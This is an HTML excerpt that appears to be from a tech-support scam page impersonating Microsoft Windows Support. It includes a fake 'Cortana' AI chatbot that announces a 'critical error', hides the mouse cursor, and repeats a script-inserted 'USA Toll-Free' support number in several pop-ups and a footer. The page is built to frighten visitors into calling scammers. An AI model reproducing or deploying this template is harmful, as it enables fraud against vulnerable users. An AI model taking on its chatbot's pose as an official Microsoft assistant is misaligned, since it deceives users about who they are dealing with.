...
<div id="ev_talkbox_min" class="">
 ...
 <div id="chat-box" class="bounce3" style="cursor:none;">
        ...
        margin-left: 6px;
        position: relative;
        top: 5px;">Microsoft</span> <p style="font-weight: 600;">Contact Windows Support:</p>
            <h4 style="font-weight: 600;"><script>document.write(phone)</script> <br>(USA Toll-Free)</h4>
        ...
        <div class="mesgs">
          <div class="msg_history">
            <div class="incoming_msg">
              <div class="received_msg">
                <div class="received_withd_msg">
                  <p>Hi! I'm Cortana, a new AI powered chatbot. Please refer to the Microsoft Privacy Statement for more information.</p>
                  </div>
              </div>
            </div>
            ...
            <div class="incoming_msg">
              <div class="received_msg">
                <div class="received_withd_msg">
                    <div class="ev_zo_img"></div>
                  <p style="    background-color: #06f;
    color: #fff;
    border-radius: 3px 12px 12px 12px;
    margin-left: 18px;
    margin-top: 7px;
    position: relative;
    max-width: 185px;font-size: 13px;
    line-height: 16px;
    max-width: 264px;
    white-space: pre-wrap;
    padding: 8px 16px;
    display: inline-block;
    box-shadow: 0 1.7px 1.7px 0 rgb(0 0 0 / 25%);"> This is a critical error. Please visit <a href="#" style="text-decoration: underline;color:#fff;">https://help.microsoft.com</a> or <a href="#" style="text-decoration: underline;color:#fff;">contact Technical Support immediately.</a></p>
                  </div>
              </div>
            </div>
...
<div id="poptxt">
    ...
    <div id="disclaimer">
        ...
        <span class="support">Contact Windows Support: <script>document.write(phone)</script> (USA Toll-Free)</span>
    </div>
    <div id="bottom">
...
<div id="pop_up_new" class="cardcontainer" style="cursor: none;">
    ...
    <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Call Windows Support: <strong>
            <script>document.write(phone)</script> (USA Toll-Free)</strong></p>
...
<!--start sticky footer-->
<!-- <div id="footer" style="top: 685px; position: absolute; cursor: none;">
    <div class="row">

        <div class="col-md-12">
            <div class="right-foot" style="text-align: center;">
                <span id="footertxt"><img src="microsoft.png"> Windows Security: </span><span style="font-weight: 700;padding-left: 13px;color: #fff;">Contact Support <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;"><script>document.write(phone)</script> </span> (Free Phone)</span>
            </div>
        </div>
